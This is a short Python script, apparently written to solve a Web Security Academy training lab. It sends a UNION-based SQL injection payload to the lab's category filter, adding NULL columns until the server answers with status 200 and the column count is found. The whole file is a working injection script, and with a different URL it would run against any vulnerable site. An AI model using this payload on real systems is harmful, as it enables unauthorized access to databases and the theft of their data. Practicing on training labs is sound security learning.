import requests
from urllib.parse import quote
n = "NULL"
url = "https://0a96004b03a994f780215d1a00cc00df.web-security-academy.net/filter?category="

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
}
sqli = "' UNION SELECT "
while(True):
    payload = sqli + n + "--"
    n = n + ", NULL"
    print(url + payload)
    response = requests.get((url + quote(payload)))
    if (response.status_code == 200):
        print("You solve the lab!")
        break